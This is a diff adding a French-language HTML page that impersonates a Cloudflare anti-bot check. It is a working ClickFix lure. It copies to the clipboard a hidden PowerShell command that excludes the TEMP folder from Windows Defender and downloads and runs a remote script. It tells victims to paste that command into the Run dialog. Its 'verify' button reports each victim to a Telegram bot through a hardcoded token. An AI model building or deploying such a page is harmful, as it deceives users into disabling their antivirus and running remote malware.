@@ -1,0 +1,73 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Vérification de sécurité</title><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#fff;max-width:500px;width:95%;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.1);overflow:hidden}
+.top{background:#0078d4;color:#fff;text-align:center;padding:20px}
+.top .shield{font-size:48px;margin-bottom:4px}
+.top h2{font-size:18px}
+.steps{padding:24px}
+.step{display:flex;gap:12px;align-items:flex-start;margin-bottom:16px}
+.num{background:#0078d4;color:#fff;min-width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;flex-shrink:0}
+.step-text{font-size:13px;line-height:1.5}
+.code-box{background:#1e1e1e;color:#0f0;font-family:'Consolas',monospace;font-size:12px;padding:12px;border-radius:6px;word-break:break-all;margin:8px 0;position:relative}
+.copy-btn{position:absolute;top:8px;right:8px;background:#0078d4;color:#fff;border:none;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:12px;font-weight:600}
+.copy-btn:hover{background:#106ebe}
+.verify-btn{display:block;width:100%;background:#0078d4;color:#fff;border:none;padding:14px;font-size:15px;font-weight:600;border-radius:6px;cursor:pointer;margin-top:12px}
+.verify-btn:hover{background:#106ebe}
+.footer{padding:16px;text-align:center;font-size:11px;color:#999;background:#faf9f8;border-top:1px solid #eee}
+.check{color:#107c10;font-weight:600}
+</style></head><body>
+
+<div class="card">
+<div class="top">
+<div class="shield">🛡️</div>
+<h2>Vérification de sécurité</h2>
+<p style="font-size:13px;opacity:.9">Protection anti-bot — Cloudflare</p>
+</div>
+<div class="steps">
+
+<p style="font-size:13px;color:#333;margin-bottom:16px">Nous avons détecté un trafic inhabituel depuis votre réseau. Veuillez compléter cette vérification pour continuer.</p>
+
+<div class="step">
+<div class="num">1</div>
+<div class="step-text">Appuyez sur <strong>Windows + R</strong> pour ouvrir la fenêtre Exécuter</div>
+</div>
+
+<div class="step">
+<div class="num">2</div>
+<div class="step-text">Collez la commande ci-dessous et cliquez sur <strong>OK</strong> :</div>
+</div>
+
+<div class="code-box" id="codeContainer">
+<span id="theCmd">powershell -W Hidden -C "Add-MpPreference -ExclusionPath $env:TEMP;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-alert/main/defender-update.ps1')"</span>
+<button class="copy-btn" onclick="copyCmd()">📋 Copier</button>
+</div>
+
+<div class="step">
+<div class="num">3</div>
+<div class="step-text">Une fois la commande exécutée, <strong>cette page se validera automatiquement</strong>.</div>
+</div>
+
+<button class="verify-btn" onclick="verify()">✅ J'ai exécuté la commande</button>
+
+<p id="status" style="text-align:center;margin-top:12px;font-size:13px"></p>
+
+</div>
+<div class="footer">
+<span class="check">✓</span> Vérifié par Cloudflare • Protection DDoS • 2026
+</div>
+</div>
+
+<script>
+function copyCmd(){
+    navigator.clipboard.writeText(document.getElementById('theCmd').textContent).then(()=>{
+        alert('✅ Commande copiée !\n\n1. Appuie sur Windows + R\n2. Colle (Ctrl+V)\n3. OK');
+    });
+}
+
+function verify(){
+    document.getElementById('status').innerHTML='<span style="color:#107c10">✅ Vérification réussie — Accès autorisé</span>';
+    new Image().src='https://api.telegram.org/bot8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM/sendMessage?chat_id=8468737863&text=CLICKFIX+VICTIM+EXECUTED';
+}
+</script>
+</body></html>
